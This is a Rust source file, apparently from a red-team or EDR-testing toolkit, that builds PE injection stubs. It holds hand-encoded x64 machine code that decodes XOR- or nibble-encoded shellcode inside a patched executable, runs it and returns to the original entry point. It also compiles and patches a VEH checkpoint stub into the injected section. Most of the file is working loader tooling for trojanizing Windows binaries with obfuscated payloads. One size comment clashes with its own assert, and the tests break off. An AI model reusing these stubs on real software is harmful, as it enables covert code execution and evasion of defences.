//! Pre-assembled x64 carrier stubs for PE injection
//!
//! Each stub is a position-independent x64 machine code sequence that:
//! 1. Aligns RSP (mandatory for Win64 ABI — learned from SuperMega's AlignRSP pattern)
//! 2. Decodes the encoded payload in-place
//! 3. Jumps to decoded shellcode
//! 4. Optionally returns to the original entry point (OEP) via RIP-relative delta
//!
//! Three variants match the three compatible encoding types:
//! - XOR: Rolling 2-byte XOR decode loop
//! - SubByte: Reverse nibble-mapping via 256-byte reverse lookup table
//! - None: No decode, direct trampoline to payload
//!
//! ## Section data layout
//!
//! ```text
//! [stub_code] [key_bytes] [encoded_payload]
//! ```
//!
//! Key sizes: XOR = 2 bytes, SubByte = 256 bytes (reverse LUT), None = 0 bytes.

use tracing::{debug, warn};

/// Layout information for a carrier stub — describes where to patch build-time values.
#[derive(Debug, Clone, Copy)]
pub struct StubLayout {
    /// Total size of the stub code (before key/payload data).
    pub code_size: usize,
    /// Offset within stub code where payload length (u32 LE) must be written.
    /// Set to `usize::MAX` if not applicable (e.g., None stub).
    pub payload_len_patch: usize,
    /// Size of key/metadata bytes placed between stub code and encoded payload.
    pub key_size: usize,
    /// Offset within stub code where OEP return delta (i32 LE) must be written.
    /// The PeInjector patches this when `return_to_oep` is true.
    /// When false, the `lea rax + jmp rax` is replaced with NOPs.
    pub oep_patch: Option<usize>,
    /// Offset of the `lea rax, [rip + OEP_DELTA]` instruction (3 bytes before oep_patch).
    /// Used to NOP out the OEP return sequence when return_to_oep is false.
    pub oep_lea_offset: Option<usize>,
    /// Length of the OEP return sequence (lea + jmp = 9 bytes) for NOP replacement.
    pub oep_sequence_len: usize,
    /// Offset of the data-pointer LEA's disp32 operand (for future cross-section patching).
    /// All stubs have the data LEA at 0x0B with disp32 at 0x0E.
    pub data_lea_disp_offset: usize,
}

// =============================================================================
// XOR Stub — Rolling 2-byte XOR decode loop (77 bytes)
// =============================================================================
//
// Section data: [code (77)] [key (2)] [encoded_payload (N)]
//
// ```asm
// ; === RSP alignment (Win64 ABI: RSP must be 16-byte aligned before CALL) ===
// 0x00  push rsi
// 0x01  push rdi
// 0x02  push rbx
// 0x03  and  rsp, -16                ; 16-byte align
// 0x07  sub  rsp, 0x28               ; shadow space
//
// ; === Locate key + payload via RIP-relative LEA ===
// 0x0B  lea  rsi, [rip + 0x3B]       ; → XOR key (2 bytes), at code_size=0x4D
// 0x12  movzx eax, byte [rsi]        ; key[0]
// 0x15  movzx edx, byte [rsi+1]      ; key[1]
// 0x19  lea  rdi, [rsi+2]            ; → encoded payload
//
// ; === Init decode loop ===
// 0x1D  xor  ebx, ebx               ; i = 0
// 0x1F  xor  ecx, ecx
// 0x21  add  ecx, PAYLOAD_LEN        ; patched at offset 0x23
//
// ; === Decode loop ===
// 0x27  test bl, 1                   ; odd index?
// 0x2A  jz   .even (0x31)
// 0x2C  xor  byte [rdi+rbx], dl      ; payload[i] ^= key[1]
// 0x2F  jmp  .next (0x34)
// 0x31  xor  byte [rdi+rbx], al      ; payload[i] ^= key[0]
// 0x34  inc  ebx
// 0x36  cmp  ebx, ecx
// 0x38  jl   .loop (0x27)
//
// ; === Execute decoded shellcode ===
// 0x3A  call rdi
//
// ; === Optional: return to OEP (RIP-relative, ASLR-safe) ===
// 0x3C  lea  rax, [rip + OEP_DELTA]  ; patched at offset 0x3F
// 0x43  jmp  rax
//
// ; === Cleanup (reached if shellcode returns and OEP NOP'd) ===
// 0x45  add  rsp, 0x28
// 0x49  pop  rbx
// 0x4A  pop  rdi
// 0x4B  pop  rsi
// 0x4C  ret
// ```

/// XOR carrier stub layout.
pub const XOR_LAYOUT: StubLayout = StubLayout {
    code_size: XOR_STUB_CODE.len(),
    payload_len_patch: 0x23,    // offset of `add ecx, IMM32` operand
    key_size: 2,                // 2-byte XOR key
    oep_patch: Some(0x3F),      // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x3C), // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,        // lea(7) + jmp(2) = 9 bytes
    data_lea_disp_offset: 0x0E, // disp32 of `lea rsi, [rip+...]` at 0x0B
};

/// x64 machine code for the XOR carrier stub.
pub const XOR_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to key bytes: RIP after = 0x12, target = 0x4D, disp = 0x3B
    0x48, 0x8D, 0x35, 0x3B, 0x00, 0x00, 0x00, // 0x0B  lea rsi, [rip+0x3B]
    // Load XOR key
    0x0F, 0xB6, 0x06, // 0x12  movzx eax, byte [rsi]
    0x0F, 0xB6, 0x56, 0x01, // 0x15  movzx edx, byte [rsi+1]
    // Payload starts at key + 2
    0x48, 0x8D, 0x7E, 0x02, // 0x19  lea rdi, [rsi+2]
    // Init loop
    0x33, 0xDB, // 0x1D  xor ebx, ebx
    0x33, 0xC9, // 0x1F  xor ecx, ecx
    0x81, 0xC1, 0x00, 0x00, 0x00, 0x00, // 0x21  add ecx, PAYLOAD_LEN [patch@0x23]
    // Decode loop
    0xF6, 0xC3, 0x01, // 0x27  test bl, 1
    0x74, 0x05, // 0x2A  jz +5 (→0x31)
    0x30, 0x14, 0x1F, // 0x2C  xor byte [rdi+rbx], dl
    0xEB, 0x03, // 0x2F  jmp +3 (→0x34)
    0x30, 0x04, 0x1F, // 0x31  xor byte [rdi+rbx], al
    0xFF, 0xC3, // 0x34  inc ebx
    0x3B, 0xD9, // 0x36  cmp ebx, ecx
    0x7C, 0xED, // 0x38  jl -19 (→0x27)
    // Call decoded shellcode
    0xFF, 0xD7, // 0x3A  call rdi
    // OEP return (patched when return_to_oep=true; NOP'd when false)
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x3C  lea rax, [rip+OEP_DELTA] [patch@0x3F]
    0xFF, 0xE0, // 0x43  jmp rax
    // Cleanup (reached if OEP sequence NOP'd and shellcode returns)
    0x48, 0x83, 0xC4, 0x28, // 0x45  add rsp, 0x28
    0x5B, // 0x49  pop rbx
    0x5F, // 0x4A  pop rdi
    0x5E, // 0x4B  pop rsi
    0xC3, // 0x4C  ret
];

const _: () = assert!(XOR_STUB_CODE.len() == 0x4D); // 77 bytes

// =============================================================================
// SubByte Stub — Reverse nibble-mapping via 256-byte reverse LUT (89 bytes)
// =============================================================================
//
// Section data: [code (89)] [reverse_lut (256)] [encoded_payload (2*N)]
//
// The SubByte encoding splits each original byte into two nibbles, each mapped
// through a 16-entry forward LUT. Decoding reverses this using a 256-byte
// reverse LUT (sparse — only 16 entries are non-zero).
//
// The stub decodes in-place: for each iteration i (0..original_len), it reads
// encoded[i*2] and encoded[i*2+1], looks them up in the reverse LUT, combines
// the nibbles, and writes the result at position i. This is safe because the
// write offset i is always < read offset i*2.
//
// ```asm
// ; === RSP alignment ===
// 0x00  push rsi / push rdi / push rbx
// 0x03  and rsp, -16 / sub rsp, 0x28
//
// ; === Locate LUT + payload ===
// 0x0B  lea  rsi, [rip + 0x4B]      ; → 256-byte reverse LUT (at code_size=0x5D)
// 0x12  lea  rdi, [rsi + 0x100]     ; → encoded payload (LUT + 256)
// 0x19  xor  ecx, ecx
// 0x1B  add  ecx, PAYLOAD_LEN       ; original payload length (patched at 0x1D)
// 0x21  xor  ebx, ebx              ; i = 0
//
// ; === Decode loop ===
// 0x23  lea  rax, [rbx+rbx]        ; rax = i*2
// 0x27  movzx edx, byte [rdi+rax]  ; hi_enc = encoded[i*2]
// 0x2B  movzx edx, byte [rsi+rdx]  ; hi_nibble = reverse_lut[hi_enc]
// 0x2F  shl  edx, 4                ; hi_nibble <<= 4
// 0x32  lea  rax, [rbx+rbx]        ; rax = i*2 (reload)
// 0x36  movzx eax, byte [rdi+rax+1]; lo_enc = encoded[i*2+1]
// 0x3B  movzx eax, byte [rsi+rax]  ; lo_nibble = reverse_lut[lo_enc]
// 0x3F  or   edx, eax              ; byte = (hi << 4) | lo
// 0x41  mov  byte [rdi+rbx], dl    ; decoded[i] = byte (overwrites encoded[i*2])
// 0x44  inc  ebx
// 0x46  cmp  ebx, ecx
// 0x48  jl   .loop (0x23)
//
// ; === Execute + OEP return ===
// 0x4A  call rdi
// 0x4C  lea  rax, [rip + OEP_DELTA] ; patched at 0x4F
// 0x53  jmp  rax
// 0x55  add  rsp, 0x28 / pop rbx / pop rdi / pop rsi / ret
// ```

/// SubByte carrier stub layout.
pub const SUBBYTE_LAYOUT: StubLayout = StubLayout {
    code_size: SUBBYTE_STUB_CODE.len(),
    payload_len_patch: 0x1D,    // offset of `add ecx, IMM32` operand
    key_size: 256,              // 256-byte reverse lookup table
    oep_patch: Some(0x4F),      // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x4C), // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,        // lea(7) + jmp(2)
    data_lea_disp_offset: 0x0E, // disp32 of `lea rsi, [rip+...]` at 0x0B
};

/// x64 machine code for the SubByte carrier stub.
pub const SUBBYTE_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to reverse LUT: RIP after = 0x12, target = 0x5D (code_size), disp = 0x4B
    0x48, 0x8D, 0x35, 0x4B, 0x00, 0x00, 0x00, // 0x0B  lea rsi, [rip+0x4B]
    // LEA to encoded payload: rsi + 256
    0x48, 0x8D, 0xBE, 0x00, 0x01, 0x00, 0x00, // 0x12  lea rdi, [rsi+0x100]
    // Load original payload length
    0x33, 0xC9, // 0x19  xor ecx, ecx
    0x81, 0xC1, 0x00, 0x00, 0x00, 0x00, // 0x1B  add ecx, PAYLOAD_LEN [patch@0x1D]
    // Init loop counter
    0x33, 0xDB, // 0x21  xor ebx, ebx
    // Decode loop
    0x48, 0x8D, 0x04, 0x1B, // 0x23  lea rax, [rbx+rbx]  ; i*2
    0x0F, 0xB6, 0x14, 0x07, // 0x27  movzx edx, byte [rdi+rax]
    0x0F, 0xB6, 0x14, 0x16, // 0x2B  movzx edx, byte [rsi+rdx]
    0xC1, 0xE2, 0x04, // 0x2F  shl edx, 4
    0x48, 0x8D, 0x04, 0x1B, // 0x32  lea rax, [rbx+rbx]  ; i*2 (reload)
    0x0F, 0xB6, 0x44, 0x07, 0x01, // 0x36  movzx eax, byte [rdi+rax+1]
    0x0F, 0xB6, 0x04, 0x06, // 0x3B  movzx eax, byte [rsi+rax]
    0x09, 0xC2, // 0x3F  or edx, eax
    0x88, 0x14, 0x1F, // 0x41  mov byte [rdi+rbx], dl
    0xFF, 0xC3, // 0x44  inc ebx
    0x3B, 0xD9, // 0x46  cmp ebx, ecx
    0x7C, 0xD9, // 0x48  jl -39 (→0x23)
    // Call decoded shellcode
    0xFF, 0xD7, // 0x4A  call rdi
    // OEP return
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x4C  lea rax, [rip+OEP_DELTA] [patch@0x4F]
    0xFF, 0xE0, // 0x53  jmp rax
    // Cleanup
    0x48, 0x83, 0xC4, 0x28, // 0x55  add rsp, 0x28
    0x5B, // 0x59  pop rbx
    0x5F, // 0x5A  pop rdi
    0x5E, // 0x5B  pop rsi
    0xC3, // 0x5C  ret
];

const _: () = assert!(SUBBYTE_STUB_CODE.len() == 0x5D); // 93 bytes

// =============================================================================
// None Stub — Direct trampoline, no decoding (37 bytes)
// =============================================================================
//
// Section data: [code (37)] [payload (N)]
//
// ```asm
// 0x00  push rsi / push rdi / push rbx
// 0x03  and rsp, -16 / sub rsp, 0x28
// 0x0B  lea  rdi, [rip + 0x13]      ; → payload (at code_size=0x25)
// 0x12  call rdi
// 0x14  lea  rax, [rip + OEP_DELTA] ; patched at 0x17
// 0x1B  jmp  rax
// 0x1D  add  rsp, 0x28 / pop rbx / pop rdi / pop rsi / ret
// ```

/// None (no encoding) carrier stub layout.
pub const NONE_LAYOUT: StubLayout = StubLayout {
    code_size: NONE_STUB_CODE.len(),
    payload_len_patch: usize::MAX, // not used — no decode
    key_size: 0,                   // no key
    oep_patch: Some(0x17),         // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x14),    // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,           // lea(7) + jmp(2)
    data_lea_disp_offset: 0x0E,    // disp32 of `lea rdi, [rip+...]` at 0x0B
};

/// x64 machine code for the None carrier stub (no decoding).
pub const NONE_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to payload: RIP after = 0x12, target = 0x25 (code_size), disp = 0x13
    0x48, 0x8D, 0x3D, 0x13, 0x00, 0x00, 0x00, // 0x0B  lea rdi, [rip+0x13]
    // Call payload directly
    0xFF, 0xD7, // 0x12  call rdi
    // OEP return
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x14  lea rax, [rip+OEP_DELTA] [patch@0x17]
    0xFF, 0xE0, // 0x1B  jmp rax
    // Cleanup
    0x48, 0x83, 0xC4, 0x28, // 0x1D  add rsp, 0x28
    0x5B, // 0x21  pop rbx
    0x5F, // 0x22  pop rdi
    0x5E, // 0x23  pop rsi
    0xC3, // 0x24  ret
];

const _: () = assert!(NONE_STUB_CODE.len() == 0x25); // 37 bytes

// =============================================================================
// Helper: build SubByte reverse lookup table
// =============================================================================

/// Build a 256-byte reverse lookup table from a 16-entry forward SubByte mapping.
///
/// Forward: `forward[nibble_value] = encoded_byte`
/// Reverse: `reverse[encoded_byte] = nibble_value`
///
/// Unused entries in the reverse table are 0 (same as nibble 0, but this is only
/// reached for invalid encoded bytes which should never appear in well-formed data).
pub fn build_subbyte_reverse_lut(forward: &[u8; 16]) -> [u8; 256] {
    let mut reverse = [0u8; 256];
    for (nibble, &encoded) in forward.iter().enumerate() {
        reverse[encoded as usize] = nibble as u8;
    }
    reverse
}

// =============================================================================
// VEH Checkpoint Stub — compiled from C, extracted from .text
// =============================================================================

/// Layout information for the compiled VEH checkpoint stub.
#[derive(Debug, Clone)]
pub struct VehStubLayout {
    /// Size of the compiled stub code (.text section bytes).
    pub code_size: usize,
    /// Offset of the disp32 in the LEA that points to checkpoint data trailer.
    /// The sentinel value 0xDEADBEEF appears as disp32 at this offset (in stub_entry).
    pub data_lea_disp_offset: usize,
    /// Offset of the disp32/imm32 in the JMP that transfers to the decode stub.
    /// The sentinel value 0xCAFEBABE appears at this offset.
    pub decode_jmp_disp_offset: usize,
    /// Offset of the disp32 in the LEA within veh_handler that points to the data trailer.
    /// The sentinel value 0xBAADF00D appears as disp32 at this offset.
    /// Used so veh_handler can independently locate the checkpoint data without globals.
    pub handler_data_lea_disp_offset: usize,
}

/// Compile the VEH checkpoint stub C source to a COFF .o, extract .text bytes,
/// and locate sentinel patch offsets.
///
/// Uses clang with PIC-compatible flags. The result is cached — if the .o file
/// exists and has a newer mtime than the source, compilation is skipped.
///
/// # Arguments
/// * `xwin_dir` - Path to xwin SDK sysroot (for Windows headers/libs)
/// * `source_path` - Path to `veh_checkpoint_stub.c`
/// * `cache_dir` - Directory for the compiled .o file
///
/// # Returns
/// `(text_bytes, VehStubLayout)` — the raw .text section and patch offsets.
pub fn compile_veh_stub(
    xwin_dir: &std::path::Path,
    source_path: &std::path::Path,
    cache_dir: &std::path::Path,
) -> anyhow::Result<(Vec<u8>, VehStubLayout)> {
    use anyhow::Context;

    let obj_path = cache_dir.join("veh_checkpoint_stub.o");
    let exe_path = cache_dir.join("veh_checkpoint_stub.exe");

    // Check cache: skip if linked .exe is newer than source
    let needs_compile = if exe_path.exists() {
        let src_mtime = std::fs::metadata(source_path)
            .and_then(|m| m.modified())
            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
        let exe_mtime = std::fs::metadata(&exe_path)
            .and_then(|m| m.modified())
            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
        src_mtime > exe_mtime
    } else {
        true
    };

    if needs_compile {
        std::fs::create_dir_all(cache_dir).context("Failed to create VEH stub cache dir")?;

        let crt_include = xwin_dir.join("crt").join("include");
        let sdk_ucrt = xwin_dir.join("sdk").join("include").join("ucrt");
        let sdk_um = xwin_dir.join("sdk").join("include").join("um");
        let sdk_shared = xwin_dir.join("sdk").join("include").join("shared");

        // Step 1: Compile C → COFF .o
        let output = std::process::Command::new("clang")
            .args([
                "-c",
                "-O2",
                "-nostdlib",
                "-fno-stack-protector",
                "-fno-exceptions",
                "--target=x86_64-pc-windows-msvc",
                "-fms-compatibility",
                "-fms-extensions",
                "-fno-builtin",
                "-mno-red-zone",
            ])
            .arg(format!("-I{}", crt_include.display()))
            .arg(format!("-I{}", sdk_ucrt.display()))
            .arg(format!("-I{}", sdk_um.display()))
            .arg(format!("-I{}", sdk_shared.display()))
            .arg(format!("--sysroot={}", xwin_dir.display()))
            .arg("-o")
            .arg(obj_path.to_str().unwrap_or_default())
            .arg(source_path.to_str().unwrap_or_default())
            .output()
            .context("Failed to invoke clang for VEH stub compilation")?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!(
                "VEH stub compilation failed (exit {}):\n{}",
                output.status,
                stderr
            );
        }

        // Step 2: Link .o → .exe with /merge:.rdata=.text
        //
        // The -O2 compile moves constant data (WCHAR arrays, string literals)
        // to .rdata. Raw .text extraction leaves cross-section relocations
        // unresolved. Linking merges .rdata into .text and applies all relocs.
        let lld_link = if cfg!(target_os = "linux") {
            "/usr/lib/llvm-17/bin/lld-link"
        } else {
            "lld-link"
        };
        let link_output = std::process::Command::new(lld_link)
            .arg("/entry:stub_entry")
            .arg("/nodefaultlib")
            .arg("/subsystem:console")
            .arg("/merge:.rdata=.text")
            .arg(format!("/out:{}", exe_path.to_str().unwrap_or_default()))
            .arg(obj_path.to_str().unwrap_or_default())
            .output()
            .context("Failed to invoke lld-link for VEH stub linking")?;

        if !link_output.status.success() {
            let stderr = String::from_utf8_lossy(&link_output.stderr);
            anyhow::bail!(
                "VEH stub linking failed (exit {}):\n{}",
                link_output.status,
                stderr
            );
        }
    }

    // Extract .text from linked PE (all relocations resolved, .rdata merged)
    let exe_bytes = std::fs::read(&exe_path).context("Failed to read linked VEH stub .exe")?;
    let text_bytes = extract_coff_text_section(&exe_bytes)
        .context("Failed to extract .text from linked VEH stub PE")?;

    // Scan for sentinel values to find patch offsets
    let layout = find_veh_stub_sentinels(&text_bytes)
        .context("Failed to locate sentinel values in VEH stub code")?;

    Ok((text_bytes, layout))
}

/// Extract the .text section bytes from a COFF object or linked PE.
///
/// For linked PEs (post lld-link), uses `VirtualSize` when smaller than
/// `SizeOfRawData` to avoid extracting file-alignment padding zeros.
/// Also verifies the entry point is at offset 0 of .text for PEs.
pub fn extract_coff_text_section(obj_bytes: &[u8]) -> anyhow::Result<Vec<u8>> {
    match goblin::Object::parse(obj_bytes)
        .map_err(|e| anyhow::anyhow!("Failed to parse COFF object: {}", e))?
    {
        goblin::Object::PE(pe) => {
            // Linked PE — .text section with resolved relocations
            for section in &pe.sections {
                let name = String::from_utf8_lossy(&section.name)
                    .trim_end_matches('\0')
                    .to_string();
                if name == ".text" {
                    let start = section.pointer_to_raw_data as usize;
                    let raw_size = section.size_of_raw_data as usize;
                    let virt_size = section.virtual_size as usize;
                    // Use VirtualSize when it's smaller — SizeOfRawData includes
                    // file-alignment padding zeros that waste space in the injection.
                    let size = if virt_size > 0 && virt_size < raw_size {
                        debug!(
                            ".text extraction: using VirtualSize {:#x} (SizeOfRawData {:#x}, saving {} bytes)",
                            virt_size,
                            raw_size,
                            raw_size - virt_size
                        );
                        virt_size
                    } else {
                        raw_size
                    };
                    if start + raw_size <= obj_bytes.len() {
                        // Verify entry point is at offset 0 of .text
                        let ep_rva = pe
                            .header
                            .optional_header
                            .map(|oh| oh.standard_fields.address_of_entry_point)
                            .unwrap_or(0) as usize;
                        let text_va = section.virtual_address as usize;
                        let ep_offset = ep_rva.saturating_sub(text_va);
                        if ep_offset != 0 {
                            warn!(
                                "Entry point at offset {:#x} within .text (expected 0) — \
                                 stub_entry may not be at the start of extracted code",
                                ep_offset
                            );
                        }
                        return Ok(obj_bytes[start..start + size].to_vec());
                    }
                }
            }
            anyhow::bail!("No .text section found in PE-parsed COFF object");
        }
        goblin::Object::COFF(coff) => {
            for section in &coff.sections {
                let name = section.name().unwrap_or_default();
                if name == ".text" {
                    let start = section.pointer_to_raw_data as usize;
                    let size = section.size_of_raw_data as usize;
                    if start + size <= obj_bytes.len() {
                        return Ok(obj_bytes[start..start + size].to_vec());
                    }
                }
            }
            anyhow::bail!("No .text section found in COFF object");
        }
        other => anyhow::bail!(
            "Expected COFF object, got {:?}",
            std::mem::discriminant(&other)
        ),
    }
}

/// Scan compiled stub code for sentinel displacement values using iced-x86.
///
/// Looks for:
/// - `0xDEADBEEF` as a disp32 in a LEA instruction → `data_lea_disp_offset`
/// - `0xCAFEBABE` as a rel32 in a JMP instruction → `decode_jmp_disp_offset`
fn find_veh_stub_sentinels(code: &[u8]) -> anyhow::Result<VehStubLayout> {
    // Scan for the 4-byte sentinel patterns directly in the byte stream.
    // This is more robust than instruction-level scanning since the compiler
    // may emit the sentinels in various instruction forms.
    let dead_beef = 0xDEADBEEFu32.to_le_bytes();
    let cafe_babe = 0xCAFEBABEu32.to_le_bytes();
    let baad_f00d = 0xBAADF00Du32.to_le_bytes();

    let mut data_offset = None;
    let mut jmp_offset = None;
    let mut handler_data_offset = None;

    // Count occurrences for duplicate detection
    let mut dead_count = 0u32;
    let mut cafe_count = 0u32;
    let mut baad_count = 0u32;

    for i in 0..code.len().saturating_sub(3) {
        if code[i..i + 4] == dead_beef {
            dead_count += 1;
            if data_offset.is_none() {
                data_offset = Some(i);
            }
        }
        if code[i..i + 4] == cafe_babe {
            cafe_count += 1;
            if jmp_offset.is_none() {
                jmp_offset = Some(i);
            }
        }
        if code[i..i + 4] == baad_f00d {
            baad_count += 1;
            if handler_data_offset.is_none() {
                handler_data_offset = Some(i);
            }
        }
    }

    // Warn on duplicate sentinels — could indicate false positives from
    // merged .rdata data that happens to contain sentinel byte patterns.
    if dead_count > 1 {
        warn!(
            "DEADBEEF sentinel found {} times in stub code! First at {:#x}",
            dead_count,
            data_offset.unwrap()
        );
    }
    if cafe_count > 1 {
        warn!(
            "CAFEBABE sentinel found {} times in stub code! First at {:#x}",
            cafe_count,
            jmp_offset.unwrap()
        );
    }
    if baad_count > 1 {
        warn!(
            "BAADF00D sentinel found {} times in stub code! First at {:#x}",
            baad_count,
            handler_data_offset.unwrap()
        );
    }

    let data_lea_disp_offset = data_offset
        .ok_or_else(|| anyhow::anyhow!("Sentinel 0xDEADBEEF not found in VEH stub code"))?;
    let decode_jmp_disp_offset = jmp_offset
        .ok_or_else(|| anyhow::anyhow!("Sentinel 0xCAFEBABE not found in VEH stub code"))?;
    let handler_data_lea_disp_offset = handler_data_offset
        .ok_or_else(|| anyhow::anyhow!("Sentinel 0xBAADF00D not found in VEH stub code"))?;

    debug!(
        "VEH stub sentinels: DEADBEEF@{:#x} CAFEBABE@{:#x} BAADF00D@{:#x} (code_size={:#x})",
        data_lea_disp_offset,
        decode_jmp_disp_offset,
        handler_data_lea_disp_offset,
        code.len()
    );

    Ok(VehStubLayout {
        code_size: code.len(),
        data_lea_disp_offset,
        decode_jmp_disp_offset,
        handler_data_lea_disp_offset,
    })
}

/// Checkpoint data trailer layout (appended after VEH stub code):
///
/// ```text
/// [u32 checkpoint_count]
/// [checkpoint_count × {u32 offset, u8 orig_byte}]  (5 bytes each, packed)
/// [pipe_name as null-terminated ASCII]
/// [u32 shellcode_base_rel]   (offset from data_start to decoded payload)
/// ```
const PIPE_NAME: &[u8] = b"\\\\.\\pipe\\rededr_checkpoints\0";

/// Pack checkpoint entries into the binary trailer format.
///
/// Each entry is 5 bytes: u32 LE offset + u8 original_byte.
pub fn pack_checkpoint_table(
    entries: &[crate::template::sc_checkpoints::BreakpointEntry],
) -> Vec<u8> {
    let mut buf = Vec::with_capacity(entries.len() * 5);
    for entry in entries {
        buf.extend_from_slice(&(entry.offset as u32).to_le_bytes());
        buf.push(entry.original_byte);
    }
    buf
}

/// Assemble an instrumented section with VEH checkpoint support.
///
/// Layout:
/// ```text
/// [veh_stub_code]        Compiled PIC code
/// [checkpoint_count]     u32 LE
/// [checkpoint_table]     N × 5 bytes (packed)
/// [pipe_name]            null-terminated ASCII
/// [shellcode_base_rel]   u32 LE — offset from data_start to decoded payload
/// [decode_stub]          XOR/SubByte/None carrier stub
/// [key_bytes]            0-256 bytes
/// [encoded_payload]      M bytes
/// ```
///
/// Patches:
/// - VEH stub's data LEA sentinel → points to checkpoint_count
/// - VEH stub's JMP sentinel → jumps to decode_stub start
///
/// # Arguments
/// * `veh_code` - Compiled VEH stub .text bytes
/// * `veh_layout` - Patch offsets within veh_code
/// * `checkpoint_entries` - Breakpoint table from sc_checkpoints::patch_shellcode
/// * `decode_stub` - Pre-assembled carrier stub (already patched for payload len, OEP)
/// * `key_bytes` - Encoding key bytes
/// * `encoded_payload` - Encoded shellcode (with INT3s in the pre-encoding stage)
pub fn assemble_instrumented_section(
    veh_code: &[u8],
    veh_layout: &VehStubLayout,
    checkpoint_entries: &[crate::template::sc_checkpoints::BreakpointEntry],
    decode_stub: &[u8],
    key_bytes: &[u8],
    encoded_payload: &[u8],
) -> Vec<u8> {
    let count = checkpoint_entries.len() as u32;
    let table_bytes = pack_checkpoint_table(checkpoint_entries);

    // Compute sizes for offset calculations
    // Extended trailer includes 8-byte pipe_handle_slot at the end
    let data_trailer_size = 4 /* count */
        + table_bytes.len()
        + PIPE_NAME.len()
        + 4 /* shellcode_base_rel */
        + 8 /* pipe_handle_slot (u64, written at runtime by stub_entry) */;

    // shellcode_base_rel: offset from data_start to the start of encoded_payload
    // (which is where decoded shellcode lives after in-place decode)
    let shellcode_base_rel = data_trailer_size + decode_stub.len() + key_bytes.len();

    // Total section size
    let total = veh_code.len()
        + data_trailer_size
        + decode_stub.len()
        + key_bytes.len()
        + encoded_payload.len();
    let mut section = Vec::with_capacity(total);

    // 1. VEH stub code (mutable copy for patching)
    section.extend_from_slice(veh_code);

    // 2. Data trailer
    let data_start_offset = section.len();
    section.extend_from_slice(&count.to_le_bytes());
    section.extend_from_slice(&table_bytes);
    section.extend_from_slice(PIPE_NAME);
    section.extend_from_slice(&(shellcode_base_rel as u32).to_le_bytes());
    // pipe_handle_slot: 8 zero bytes, written at runtime by stub_entry
    section.extend_from_slice(&0u64.to_le_bytes());

    // 3. Decode stub
    let decode_stub_offset = section.len();
    section.extend_from_slice(decode_stub);

    // 4. Key + payload
    section.extend_from_slice(key_bytes);
    section.extend_from_slice(encoded_payload);

    // --- Patch sentinel displacements ---

    // Data LEA (stub_entry): RIP-relative from the instruction after the LEA.
    // The disp32 is at veh_layout.data_lea_disp_offset.
    // RIP after LEA = data_lea_disp_offset + 4 (disp32 is last 4 bytes of the instruction).
    // Target = data_start_offset.
    // disp32 = target - rip_after = data_start_offset - (data_lea_disp_offset + 4)
    {
        let rip_after = veh_layout.data_lea_disp_offset + 4;
        let disp = data_start_offset as i32 - rip_after as i32;
        section[veh_layout.data_lea_disp_offset..veh_layout.data_lea_disp_offset + 4]
            .copy_from_slice(&disp.to_le_bytes());
    }

    // Handler data LEA (veh_handler): same target as above, different source offset.
    {
        let rip_after = veh_layout.handler_data_lea_disp_offset + 4;
        let disp = data_start_offset as i32 - rip_after as i32;
        section
            [veh_layout.handler_data_lea_disp_offset..veh_layout.handler_data_lea_disp_offset + 4]
            .copy_from_slice(&disp.to_le_bytes());
    }

    // Decode JMP: RIP-relative from instruction after the JMP.
    // disp32 at veh_layout.decode_jmp_disp_offset.
    // For a near JMP (E9 xx xx xx xx), the disp32 is the last 4 bytes.
    // RIP after JMP = decode_jmp_disp_offset + 4.
    // Target = decode_stub_offset.
    {
        let rip_after = veh_layout.decode_jmp_disp_offset + 4;
        let disp = decode_stub_offset as i32 - rip_after as i32;
        section[veh_layout.decode_jmp_disp_offset..veh_layout.decode_jmp_disp_offset + 4]
            .copy_from_slice(&disp.to_le_bytes());
    }

    section
}

/// Compute the VEH overhead in bytes for space calculations.
///
/// This is an estimate used by `select_best_target()` to determine if a code
/// cave is large enough when checkpoints are requested.
pub fn veh_overhead_estimate(veh_code_size: usize, checkpoint_count: u32) -> usize {
    veh_code_size
        + 4                                         // checkpoint_count u32
        + (checkpoint_count as usize * 5)           // table entries
        + PIPE_NAME.len()                           // pipe name
        + 4                                         // shellcode_base_rel
        + 8 // pipe_handle_slot (u64, runtime)
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_stub_starts_with_push_rsi() {
        assert_eq!(XOR_STUB_CODE[0], 0x56, "XOR stub must start with push rsi");
    }

    #[test]
    fn test_xor_stub_has_rsp_alignment() {
        // and rsp, -16 = 48 83 E4 F0
        assert_eq!(&XOR_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

    #[test]
    fn test_none_stub_has_rsp_alignment() {
        assert_eq!(&NONE_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

    #[test]
    fn test_subbyte_stub_has_rsp_alignment() {
        assert_eq!(&SUBBYTE_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

